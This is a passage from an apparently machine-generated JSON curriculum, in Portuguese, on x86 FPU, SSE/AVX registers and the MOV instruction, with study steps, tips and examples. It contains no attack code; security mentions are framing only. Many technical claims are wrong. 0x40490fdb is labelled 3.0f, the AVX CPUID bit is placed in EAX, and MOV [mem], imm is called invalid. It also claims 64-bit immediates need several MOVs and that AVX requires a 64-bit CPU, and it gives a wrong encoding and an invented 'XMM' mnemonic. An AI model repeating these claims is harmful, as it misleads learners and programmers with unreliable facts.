                                "Análise de Binários: Identificação em reverse engineering.",
                                "Programação em C: Comportamento de floats com -mfpmath=387.",
                                "Segurança Computacional: Exploits em FPU para bypass de detecção.",
                                "Arquitetura de Computadores: Evolução para SSE/AVX."
                              ],
                              "realWorldApplication": "Em análise forense de malware ou engenharia reversa, descrever FPU x87 ajuda a decifrar rotinas matemáticas ofuscadas em binários legados, como cálculos de chaves em ransomwares antigos ou simulações físicas em jogos."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.3.2",
                            "name": "Identificar registradores SSE/AVX",
                            "description": "Listar XMM0-XMM15 (128 bits) em SSE/SSE2 e extensões YMM0-YMM15 (256 bits) em AVX em ambas arquiteturas, descrevendo uso em instruções SIMD como ADDPS, MOVAPS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Registradores SSE (XMM0-XMM15)",
                                  "subSteps": [
                                    "Estude a introdução aos registradores SSE em documentação oficial da Intel/AMD.",
                                    "Liste os registradores XMM0 até XMM15 e memorize que são 16 registradores de 128 bits cada.",
                                    "Analise o uso em extensões SSE e SSE2 para operações SIMD em ponto flutuante e inteiros.",
                                    "Identifique como eles são acessados em modo x86-32 (inicialmente XMM0-XMM7) e x86-64 (todos 16).",
                                    "Pratique visualizando diagramas de layout de registradores em ferramentas como Intel Intrinsics Guide."
                                  ],
                                  "verification": "Escreva uma lista numerada de XMM0-XMM15 com tamanho e extensões associadas sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manual Intel 64 and IA-32 Architectures Software Developer’s Manual (Vol. 2)",
                                    "Ferramenta online Intel Intrinsics Guide",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use mnemônicos como 'XMM' para eXtendable Memory Management para facilitar memorização.",
                                  "learningObjective": "Dominar a identificação e características básicas dos registradores SSE em ambas as arquiteturas.",
                                  "commonMistakes": [
                                    "Confundir XMM com registradores GPR como EAX",
                                    "Esquecer que em x86-32 apenas 8 são diretamente acessíveis sem MXCSR",
                                    "Ignorar o suporte a dados packed (SIMD)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar os Registradores AVX (YMM0-YMM15)",
                                  "subSteps": [
                                    "Revise as extensões AVX e AVX2 introduzidas para registradores de 256 bits.",
                                    "Liste YMM0 até YMM15, notando que compartilham espaço inferior com XMM0-XMM15.",
                                    "Estude o modo EVEX para AVX-512, mas foque em AVX básico com 256 bits.",
                                    "Compare acesso em x86-32 (limitado) vs x86-64 (todos 16 disponíveis).",
                                    "Examine diagramas de upper/lower 128 bits nos registradores YMM."
                                  ],
                                  "verification": "Desenhe ou descreva o layout de um registrador YMM mostrando XMM lower e upper bits.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Intel AVX Programming Reference",
                                    "Diagramas de registradores do Agner Fog's Instruction Tables",
                                    "Visualizador de registradores como em GDB ou WinDbg"
                                  ],
                                  "tips": "Lembre-se: YMM estende XMM; instruções AVX preservam upper bits se não inicializados.",
                                  "learningObjective": "Identificar registradores AVX e suas relações com SSE.",
                                  "commonMistakes": [
                                    "Achar que YMM são independentes de XMM",
                                    "Confundir AVX com AVX2 (que adiciona inteiros)",
                                    "Subestimar overhead de AVX em CPUs antigas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diferenciar Uso em Arquiteturas x86-32 e x86-64",
                                  "subSteps": [
                                    "Compare o número de registradores visíveis: x86-32 (SSE: 8, AVX: similar) vs x86-64 (16 para ambos).",
                                    "Estude flags de CPU (CPUID) para detectar suporte SSE/AVX.",
                                    "Analise como registradores são salvos em context switches (XSAVE/XRSTOR).",
                                    "Pratique listando todos em contexto de 32-bit vs 64-bit assembly.",
                                    "Verifique diferenças em calling conventions (ex: Windows x64 passa floats em XMM0-XMM3)."
                                  ],
                                  "verification": "Crie uma tabela comparativa de XMM/YMM em x86-32 vs x86-64 com contagens corretas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "CPUID tool ou código de detecção",
                                    "NASM ou GAS assembler",
                                    "Documentação Microsoft x64 ABI"
                                  ],
                                  "tips": "Use CPUID leaf 1 (EDX bit 25 para SSE, EAX bit 28 para AVX) para verificação prática.",
                                  "learningObjective": "Distinguir comportamentos de registradores SSE/AVX entre arquiteturas.",
                                  "commonMistakes": [
                                    "Assumir que x86-32 tem 16 XMM sempre",
                                    "Ignorar AVX desabilitado por OS em 32-bit",
                                    "Confundir com ARM NEON"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar em Instruções SIMD como ADDPS e MOVAPS",
                                  "subSteps": [
                                    "Estude sintaxe de ADDPS (add packed single-precision float) usando XMM/YMM.",
                                    "Analise MOVAPS (move aligned packed single-float) e suas variantes.",
                                    "Desmonte código assembly simples com essas instruções usando objdump ou IDA Free.",
                                    "Identifique operandos: ex: ADDPS XMM0, XMM1 ou AVX: VADDPS YMM0, YMM1, [mem].",
                                    "Pratique reconhecendo em binários reais ou snippets."
                                  ],
                                  "verification": "Desmonte um snippet assembly e rotule todos registradores SSE/AVX usados corretamente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Compilador GCC com -O2 para gerar SIMD",
                                    "Objdump ou Ghidra",
                                    "Exemplos de código assembly NASM"
                                  ],
                                  "tips": "Compile C com -msse2 -mavx e desmonte para ver uso real.",
                                  "learningObjective": "Reconhecer registradores SSE/AVX em instruções SIMD práticas.",
                                  "commonMistakes": [
                                    "Confundir ADDPS (float) com PADDD (int)",
                                    "Ignorar alinhamento em MOVAPS (crash se não aligned)",
                                    "Não notar prefixos VEX para AVX"
                                  ]
                                }
                              ],
                              "practicalExample": "Em assembly x86-64: \nsection .data\nvec1 dq 0x40490fdb,0x40490fdb,0x40490fdb,0x40490fdb  ; 3.0f x4\nvec2 dq 0x40000000,0x40000000,0x40000000,0x40000000  ; 2.0f x4\nsection .text\nglobal _start\n_start:\nmovaps xmm0, [vec1]\nmovaps xmm1, [vec2]\naddps xmm0, xmm1  ; XMM0 agora tem 5.0f x4\n; Para AVX: vaddps ymm0, ymm0, [vec2] (requer AVX)",
                              "finalVerifications": [
                                "Lista completa e correta de XMM0-XMM15 e YMM0-YMM15 com tamanhos.",
                                "Explica diferenças de acessibilidade em x86-32 vs x86-64.",
                                "Identifica registradores em instruções como ADDPS XMM2, [esi] ou VADDPS YMM3, YMM4, ymm5.",
                                "Detecta suporte via CPUID em código ou ferramenta.",
                                "Desmonta snippet e rotula todos SSE/AVX corretamente.",
                                "Descreve preservação de upper bits em transições SSE para AVX."
                              ],
                              "assessmentCriteria": [
                                "Precisão na listagem de registradores (100% correto).",
                                "Correta diferenciação entre SSE (128-bit) e AVX (256-bit).",
                                "Compreensão de contextos arquiteturais (32 vs 64-bit).",
                                "Habilidade em identificar em disassembly real.",
                                "Explicação clara de uso em instruções SIMD.",
                                "Ausência de confusões com outros registradores ou extensões."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/C++ com intrinsics (_mm_add_ps para SSE, _mm256_add_ps para AVX).",
                                "Otimização de performance em computação científica (ex: NumPy/SciPy usa SIMD).",
                                "Análise de vulnerabilidades em binários (ex: ROP chains usando XMM em exploits).",
                                "Engenharia reversa com ferramentas como Radare2 ou Binary Ninja.",
                                "Arquitetura de computadores (pipelining e execução out-of-order com SIMD)."
                              ],
                              "realWorldApplication": "Em segurança computacional, identificar registradores SSE/AVX em análise de malwares permite detectar rotinas de criptografia rápida (ex: AES-NI via SIMD), ofuscação de payloads ou exploits que manipulam floats para bypass de detecção em binários compilados com otimizações SIMD."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.3.3",
                            "name": "Comparar FPU/SSE entre x86-32 e x86-64",
                            "description": "Explicar compatibilidade (mesmo número de registradores), mas mais registros disponíveis em 64 bits via RFLAGS e maior suporte a AVX-512 (ZMM0-ZMM31), relevante para análise de código otimizado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar registradores FPU (x87) em x86-32",
                                  "subSteps": [
                                    "Ler seção relevante dos manuais Intel/AMD sobre FPU x87 em modo 32-bit.",
                                    "Identificar os 8 registradores de pilha ST0-ST7 (80-bit cada).",
                                    "Entender o ponteiro TOP que gerencia o topo da pilha.",
                                    "Exemplificar operações básicas como FLD (load) e FSTP (store/pop).",
                                    "Simular uma operação de soma FP em um emulador como DOSBox ou Bochs."
                                  ],
                                  "verification": "Descrever verbalmente ou por escrito o fluxo de uma operação FLD ST0 + ST1 → ST0, atualizando TOP.",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "Intel 64 and IA-32 Architectures Software Developer’s Manual (Vol. 1)",
                                    "Emulador x86-32 como DOSBox ou online assembly playground"
                                  ],
                                  "tips": "Visualize a pilha como uma stack de pratos: TOP aponta para o prato superior acessível como ST0.",
                                  "learningObjective": "Compreender a arquitetura stack-based da FPU x87 e suas limitações em 32-bit.",
                                  "commonMistakes": [
                                    "Confundir registradores FPU com XMM (vetoriais).",
                                    "Ignorar que TOP é cíclico (mod 8).",
                                    "Assumir acesso direto por índice fixo sem TOP."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar FPU em x86-64 e sua compatibilidade com x86-32",
                                  "subSteps": [
                                    "Comparar documentação: confirmar que FPU x87 permanece idêntica (ST0-ST7, TOP).",
                                    "Verificar modo de compatibilidade 32-bit em 64-bit OS via syscalls ou gdb.",
                                    "Executar código assembly x87 em ambiente 64-bit e observar comportamento.",
                                    "Identificar diferenças sutis como tamanho de ponteiro em instruções (mas FPU ops iguais).",
                                    "Testar emulador 64-bit para validar stack overflow em FPU."
                                  ],
                                  "verification": "Executar snippet assembly x87 em gdb 64-bit e confirmar ST0-ST7 funcionam igual ao 32-bit.",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "Intel SDM Vol. 2 (Instruction Set Reference)",
                                    "GDB debugger",
                                    "Compilador NASM ou GAS"
                                  ],
                                  "tips": "Use 'info registers' no GDB para inspecionar %st0-%st7 em sessões 32 e 64-bit.",
                                  "learningObjective": "Reconhecer a compatibilidade backward da FPU x87 entre 32 e 64-bit.",
                                  "commonMistakes": [
                                    "Assumir novos registradores em 64-bit para FPU (não há).",
                                    "Confundir FPU com SSE/AVX que expandem em 64-bit.",
                                    "Ignorar modo legacy 32-bit em executáveis 64-bit."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar registradores SSE (XMM) entre x86-32 e x86-64",
                                  "subSteps": [
                                    "Em x86-32: listar XMM0-XMM7 (128-bit cada, 8 totais).",
                                    "Em x86-64: expandir para XMM0-XMM15 (16 totais, acessados via REX prefix).",
                                    "Estudar instruções SSE como MOVAPS, ADDPS em ambos modos.",
                                    "Disassemblar código compilado com SSE em 32 e 64-bit usando objdump.",
                                    "Verificar limitação de 8 XMM em 32-bit vs 16 em 64-bit em loops vetorizados."
                                  ],
                                  "verification": "Criar tabela comparativa: #XMM, tamanho, prefixos necessários (REX.W para 64-bit).",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Intel SDM Vol. 1 (SSE chapter)",
                                    "objdump ou IDA Free",
                                    "Exemplos de código SSE em GitHub"
                                  ],
                                  "tips": "Compile com -m32/-m64 e -msse2 para observar diferenças no binário.",
                                  "learningObjective": "Diferenciar o número e acesso a registradores XMM entre arquiteturas.",
                                  "commonMistakes": [
                                    "Esquecer REX prefix para XMM8-15 em 64-bit.",
                                    "Assumir XMM16+ sem AVX (só com AVX-512).",
                                    "Misturar YMM (256-bit) com XMM base."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar suporte a AVX e AVX-512 em x86-64 vs ausência em x86-32",
                                  "subSteps": [
                                    "Confirmar AVX ausente em puro x86-32 (requer CPU 64-bit).",
                                    "Em x86-64: YMM0-YMM15 (256-bit via AVX), ZMM0-ZMM31 (512-bit via AVX-512).",
                                    "Listar flags CPUID para detectar AVX/AVX-512 (EAX=7).",
                                    "Compilar código AVX e disassemblar: notar EVEX prefix para ZMM.",
                                    "Simular performance gain em vetorização FP com 32 ZMM vs 8 XMM."
                                  ],
                                  "verification": "Executar CPUID em assembly e relatar bits para AVX512F (bit 16 em EBX).",
                                  "estimatedTime": "35 minutes",
                                  "materials": [
                                    "CPUID explorers online",
                                    "Compilador GCC com -mavx512f",
                                    "Intel Intrinsics Guide"
                                  ],
                                  "tips": "Teste em VM com CPU sem AVX-512 para ver falhas em 32-bit simulação.",
                                  "learningObjective": "Entender expansão de registradores FP vetorizados exclusiva de x86-64.",
                                  "commonMistakes": [
                                    "Confundir AVX-512 com SSE (prefixos diferentes: VEX vs EVEX).",
                                    "Assumir compatibilidade 32-bit para AVX (hardware 64-bit só).",
                                    "Ignorar overhead de máscaras k0-k7 em AVX-512."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar comparação em análise de código binário otimizado",
                                  "subSteps": [
                                    "Disassemblar binário real (ex: libcrypto) em 32 e 64-bit.",
                                    "Identificar uso de SSE/AVX em funções FP como crypto hashes.",
                                    "Comparar otimizações: mais unrolls em 64-bit devido a +XMM.",
                                    "Analisar exploit PoC usando AVX para bypass mitigações.",
                                    "Documentar tabela de diferenças observadas no disassembly."
                                  ],
                                  "verification": "Produzir relatório curto listando 3 diferenças FP/SSE vistas em binários reais.",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "Binários sample de VirusTotal ou compilados",
                                    "Ghidra ou Radare2",
                                    "Exploit-DB samples"
                                  ],
                                  "tips": "Busque por 'vmovaps' (AVX) vs 'movaps' (SSE) em strings do binário.",
                                  "learningObjective": "Integrar comparação FPU/SSE na prática de análise reversa.",
                                  "commonMistakes": [
                                    "Focar só em teoria sem disassembly real.",
                                    "Confundir registradores em mixed-mode code.",
                                    "Subestimar impacto em performance/security."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C simples com função seno usando SSE/AVX: `float sin_sse(float* arr, int n)` otimizado com -O3 -msse2 -mavx512f em -m32 vs -m64. Disasseble com objdump -d e compare uso de XMM0-7 (32-bit, spills) vs XMM0-15/ZMM0-7 (64-bit, vetorização full). Observe como 64-bit processa 16 floats por instrução vs 4 em 32-bit.",
                              "finalVerifications": [
                                "Listar corretamente 8 ST0-ST7 iguais em ambos modos.",
                                "Confirmar 8 XMM em 32-bit vs 16 em 64-bit.",
                                "Explicar papel do REX prefix para XMM8-15.",
                                "Identificar ZMM0-ZMM31 só em AVX-512 (64-bit).",
                                "Detectar via CPUID as features FP disponíveis.",
                                "Comparar performance teórica: throughput FP ops."
                              ],
                              "assessmentCriteria": [
                                "Precisão na contagem e nomes de registradores (100% match).",
                                "Correta explicação de compatibilidade FPU (sem diferenças funcionais).",
                                "Identificação de prefixos (REX, VEX, EVEX) e seu propósito.",
                                "Análise prática via disassembly sem erros de interpretação.",
                                "Conexão clara com análise de código otimizado/segurança.",
                                "Relatório estruturado com tabelas ou diagramas."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Evolução de SIMD (SSE→AVX).",
                                "Otimização de Performance: Vetorização em compiladores.",
                                "Segurança Computacional: Exploração de FP em ROP chains.",
                                "Engenharia de Software: Portabilidade 32/64-bit.",
                                "Análise de Malware: Detecção de AVX em binários avançados."
                              ],
                              "realWorldApplication": "Em análise de binários maliciosos ou software otimizado, comparar FPU/SSE permite detectar código 64-bit only (ex: AVX-512 em ransomware recente), otimizar payloads para legacy 32-bit systems, ou reverse exploits que usam ZMM registers para dados criptográficos eficientes, essencial em CTFs e threat hunting."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.2",
                    "name": "Instruções Básicas de Assembly",
                    "description": "Principais instruções como MOV, ADD, SUB, JMP e suas variações em Assembly 32 e 64 bits.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.2.1",
                        "name": "Instrução MOV",
                        "description": "A instrução MOV é usada para copiar dados de uma fonte para um destino, sem alterar flags, sendo fundamental para movimentação de dados entre registradores, memória e imediatos em Assembly x86 32 e 64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.1.1",
                            "name": "Identificar sintaxe e operandos da MOV em 32 bits",
                            "description": "Reconhecer variações como MOV reg, reg; MOV reg, imm; MOV reg, [mem]; MOV [mem], reg, e ler exemplos em código desmontado usando ferramentas como objdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a sintaxe geral da instrução MOV em 32 bits",
                                  "subSteps": [
                                    "Leia a documentação oficial da Intel para a instrução MOV (Volume 2 do Manual de Desenvolvedor Intel)",
                                    "Identifique que MOV copia dados de um operando fonte para um operando destino sem alterar flags",
                                    "Memorize a forma geral: MOV destino, fonte",
                                    "Note que o tamanho é 32 bits para registradores e endereços em modo 32-bit",
                                    "Diferencie MOV de outras instruções de movimento como PUSH/POP"
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a sintaxe geral e dê um exemplo simples como 'MOV EAX, EBX'",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Manual Intel SDM Volume 2 (PDF)",
                                    "Editor de texto para notas"
                                  ],
                                  "tips": "Sempre verifique o modo de operação (32-bit) para evitar confusão com 64-bit (X64)",
                                  "learningObjective": "Compreender a estrutura básica e o propósito da instrução MOV em assembly x86-32",
                                  "commonMistakes": [
                                    "Confundir MOV com instruções que alteram flags como ADD",
                                    "Ignorar o tamanho dos operandos (32-bit)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar as variações principais de operandos para MOV",
                                  "subSteps": [
                                    "Estude MOV reg, reg (ex: MOV EAX, EBX)",
                                    "Analise MOV reg, imm (ex: MOV EAX, 0x1234)",
                                    "Examine MOV reg, [mem] (ex: MOV EAX, [EBP+8])",
                                    "Revise MOV [mem], reg (ex: MOV [ESP], EAX)",
                                    "Liste restrições: destino não pode ser imediato, memória para memória não é permitida diretamente"
                                  ],
                                  "verification": "Liste as 4 variações com um exemplo cada e identifique qual é inválida (ex: MOV [mem], imm)",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela de operandos x86-32 (referência online ou PDF)",
                                    "Papel e caneta para diagramas"
                                  ],
                                  "tips": "Use notação [ ] para denotar endereço de memória e evite confundir com registradores",
                                  "learningObjective": "Reconhecer e diferenciar todas as combinações válidas de operandos para MOV em 32 bits",
                                  "commonMistakes": [
                                    "Achar que MOV [mem1], [mem2] é permitido",
                                    "Confundir imm com reg em exemplos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar exemplos de MOV em código assembly desmontado",
                                  "subSteps": [
                                    "Escreva um programa C simples que use variáveis e loops, compile para 32-bit",
                                    "Use objdump -d para desmontar e localize instruções MOV",
                                    "Identifique operandos em cada MOV encontrada (reg-reg, reg-imm, etc.)",
                                    "Anotar o contexto: MOV para setup de parâmetros, salvamento de registradores",
                                    "Compare com assembly escrito manualmente para validar"
                                  ],
                                  "verification": "Desmonte um binário simples e rotule 5 instruções MOV com seus tipos de operandos",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC para compilar (gcc -m32)",
                                    "objdump (parte do binutils)",
                                    "Programa C de exemplo"
                                  ],
                                  "tips": "Compile com -m32 para garantir modo 32-bit; use -static para binários standalone",
                                  "learningObjective": "Aplicar o conhecimento de sintaxe para interpretar MOV em código real desmontado",
                                  "commonMistakes": [
                                    "Interpretar offsets como registradores",
                                    "Ignorar prefixos de tamanho em objdump"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação com cenários variados e ferramentas",
                                  "subSteps": [
                                    "Baixe binários de exemplo ou crie um com assembly NASM (nasm -f elf32)",
                                    "Execute objdump em múltiplos binários e categorize todas as MOVs",
                                    "Simule erros: altere um binário ligeiramente e veja impacto na desmontagem",
                                    "Crie um checklist para cada MOV: tipo, fonte, destino, tamanho",
                                    "Teste em um debugger como GDB para ver execução passo a passo"
                                  ],
                                  "verification": "Analise um binário fornecido e produza um relatório com 10 MOVs identificadas corretamente",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB debugger",
                                    "Binários de teste (ex: hello world 32-bit)"
                                  ],
                                  "tips": "Use 'objdump -d -M intel' para sintaxe Intel legível; pratique com binários reais de CTFs",
                                  "learningObjective": "Dominar a identificação rápida e precisa de MOV em contextos reais de análise binária",
                                  "commonMistakes": [
                                    "Não notar modos de endereço como [reg + disp]",
                                    "Confundir com MOVZX/MOVSX"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário desmontado com objdump: '8b 45 fc  mov    eax,DWORD PTR [ebp-0x4]' - Aqui, MOV reg, [mem] onde reg=EAX, mem=[EBP-4]; copia valor de pilha para EAX.",
                              "finalVerifications": [
                                "Liste corretamente as 4 variações de MOV sem erros",
                                "Analise um snippet de objdump e identifique todos os operandos de MOV",
                                "Explique por que MOV [mem], imm requer instruções auxiliares",
                                "Diferencie MOV reg, reg de MOVSX em um exemplo",
                                "Desmonte um binário simples e rotule 100% das MOVs corretamente",
                                "Identifique MOV em contexto de função (prólogo/epílogo)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos de operandos (90%+ correto)",
                                "Completude na lista de variações e restrições",
                                "Capacidade de interpretar objdump output sem erros de sintaxe",
                                "Explicação clara de contexto em exemplos reais",
                                "Velocidade e confiança em análises independentes",
                                "Integração com ferramentas como objdump/GDB"
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender registradores e memória em x86",
                                "Programação em C: Relacionar com acessos a variáveis e ponteiros",
                                "Segurança Cibernética: Base para análise de exploits e shellcode",
                                "Engenharia de Software: Debug e otimização de código assembly",
                                "Matemática Discreta: Representação binária de imediatos e endereços"
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering de software protegido, identificar MOVs permite mapear fluxo de dados, detectar ofuscação e reconstruir lógica de programas binários, essencial para profissionais de cibersegurança em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.2",
                            "name": "Diferenciar MOV em 32 bits vs 64 bits",
                            "description": "Comparar uso de registradores como EAX/RAX, tamanhos de imediatos (32-bit vs 64-bit) e endereçamento de memória, identificando extensões RIP-relative em 64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Registradores em Arquitetura x86-32 e x86-64",
                                  "subSteps": [
                                    "Liste os registradores de propósito geral em 32 bits (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP).",
                                    "Identifique as extensões em 64 bits (RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP) e registradores adicionais (R8-R15).",
                                    "Compare tamanhos: 32 bits vs 64 bits, e sub-registradores (AX, AH, AL dentro de EAX/RAX).",
                                    "Examine o papel do registrador de instrução RIP em 64 bits vs EIP em 32 bits.",
                                    "Anote convenções de chamada: parâmetros em pilha (32-bit) vs registradores (64-bit)."
                                  ],
                                  "verification": "Crie uma tabela comparativa de registradores com exemplos de uso em MOV.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (volumes 2A/2B)",
                                    "Ferramenta de referência como x86 opcode reference online"
                                  ],
                                  "tips": "Use diagramas visuais para mapear registradores de 8/16/32/64 bits hierarquicamente.",
                                  "learningObjective": "Entender a hierarquia e diferenças de registradores entre modos 32 e 64 bits.",
                                  "commonMistakes": [
                                    "Confundir EAX com RAX sem notar o prefixo REX",
                                    "Ignorar registradores altos R8-R15 em 64 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar MOV com Imediatos em 32 vs 64 Bits",
                                  "subSteps": [
                                    "Escreva exemplos de MOV reg, imm8/imm16/imm32 em 32 bits (ex: mov eax, 0x12345678).",
                                    "Compare com 64 bits: MOV reg, imm32 sign-extended para 64 bits (ex: mov rax, 0x12345678).",
                                    "Teste limites: Imediatos maiores que 32 bits requerem múltiplas MOV em 64 bits.",
                                    "Use um disassembler para inspecionar encodings de bytes e prefixos REX.",
                                    "Verifique como immediatos são truncados ou estendidos em cada modo."
                                  ],
                                  "verification": "Desmonte código assembly simples e identifique tamanhos de immediatos corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Compilador NASM ou GAS",
                                    "Disassembler como objdump ou Ghidra"
                                  ],
                                  "tips": "Sempre verifique o mapa de opcodes para confirmar comprimentos de instrução.",
                                  "learningObjective": "Diferenciar handling de valores imediatos na instrução MOV entre arquiteturas.",
                                  "commonMistakes": [
                                    "Assumir que imm64 é diretamente suportado sem múltiplas instruções",
                                    "Não notar sign-extension de imm32 em 64 bits"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Endereçamento de Memória em MOV 32 vs 64 Bits",
                                  "subSteps": [
                                    "Revise modos de endereçamento em 32 bits: [base + index*scale + disp] com ESP/EBP.",
                                    "Em 64 bits, note limites de displacement (disp32) e uso de RSP/RBP.",
                                    "Compare stack frames: push/pop em 32 vs 64 bits com alinhamento 16 bytes.",
                                    "Analise exemplos de MOV [reg + disp], imm vs mov [reg], reg.",
                                    "Identifique impactos em tamanho de instrução devido a prefixos."
                                  ],
                                  "verification": "Escreva e dismonte 3 exemplos de MOV memória em cada modo, comparando encodings.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de assembly como NASM",
                                    "Debugger como GDB ou x64dbg"
                                  ],
                                  "tips": "Use GDB com 'x/i $pc' para inspecionar instruções em runtime.",
                                  "learningObjective": "Dominar diferenças em operações de memória para MOV entre 32 e 64 bits.",
                                  "commonMistakes": [
                                    "Esquecer alinhamento de stack em 64 bits (shadow space)",
                                    "Confundir disp8/disp32 em cálculos de endereço"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar RIP-Relative Addressing Exclusivo de 64 Bits",
                                  "subSteps": [
                                    "Defina RIP-relative: [rip + disp32], calculado como endereço da próxima instrução + disp.",
                                    "Compare com 32 bits (sem suporte direto, usa EIP mas limitado).",
                                    "Escreva exemplo: mov rax, [rel dados] e dismonte para ver encoding.",
                                    "Teste em código real: compile PIC (Position Independent Code) e analise.",
                                    "Discuta vantagens: relocabilidade em ASLR e PIE executáveis."
                                  ],
                                  "verification": "Converta um endereço absoluto 32-bit para RIP-relative em 64-bit e valide com disassembler.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Exemplos de código PIC em GitHub",
                                    "Ferramentas como radare2 ou IDA Free para análise"
                                  ],
                                  "tips": "Calcule manualmente: endereço RIP = endereço fim da instrução.",
                                  "learningObjective": "Compreender e aplicar endereçamento RIP-relative único em x86-64.",
                                  "commonMistakes": [
                                    "Erro no cálculo de RIP (esquecer tamanho da instrução)",
                                    "Aplicar RIP-relative em código 32-bit"
                                  ]
                                }
                              ],
                              "practicalExample": "Em 32 bits: mov eax, 0xDEADBEEF  (5 bytes: B8 EF BE AD DE)\nEm 64 bits: mov rax, 0xDEADBEEF  (7 bytes: 48 B8 EF BE AD DE 00 00 00 com sign-extend)\nRIP-relative 64-bit: mov rax, [rip+0x10]  (lea ou mov para acessar dados relativos). Use NASM para montar e objdump -d para comparar.",
                              "finalVerifications": [
                                "Liste 5 diferenças chave entre MOV 32 e 64 bits.",
                                "Dismonte um binário misto e identifique instruções MOV corretamente.",
                                "Explique por que RIP-relative é preferido em 64 bits.",
                                "Converta um snippet MOV 32-bit para equivalente 64-bit funcional.",
                                "Identifique prefixos REX em encodings MOV 64-bit.",
                                "Discuta impacto em análise de binários com ASLR."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e seus tamanhos (90%+ correto).",
                                "Compreensão correta de sign-extension e limites de immediatos.",
                                "Capacidade de decodificar encodings de bytes manualmente.",
                                "Explicação clara de RIP-relative com cálculo exemplo.",
                                "Aplicação prática em disassembly sem erros comuns.",
                                "Integração de conceitos em cenários de segurança computacional."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compiladores geram MOV para variáveis locais/globais.",
                                "Análise de Malware: Diferenciar payloads 32 vs 64 bits em exploits.",
                                "Sistemas Operacionais: Convenções de ABI (Application Binary Interface) x86/x64.",
                                "Engenharia Reversa: Uso em tools como Ghidra/IDA para análise binária."
                              ],
                              "realWorldApplication": "Em segurança computacional, diferenciar MOV 32/64 bits é essencial para análise de binários em reverse engineering, detecção de shellcodes multiplataforma e bypass de ASLR em exploits, permitindo engenheiros de segurança dissecar malware ou debugar vulnerabilidades em ambientes mistos x86/x64."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.3",
                            "name": "Aplicar MOV em exemplos de análise binária",
                            "description": "Analisar trechos de código binário para identificar MOV em buffer overflows ou shellcodes, escrevendo um exemplo simples que carrega um valor em registrador.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar sintaxe e opcodes da instrução MOV em Assembly x86/x64",
                                  "subSteps": [
                                    "Estude a sintaxe básica: MOV destino, origem (registrador, memória, imediato)",
                                    "Memorize opcodes comuns: B8-BF para MOV reg32, imm32; C6/C7 para memória",
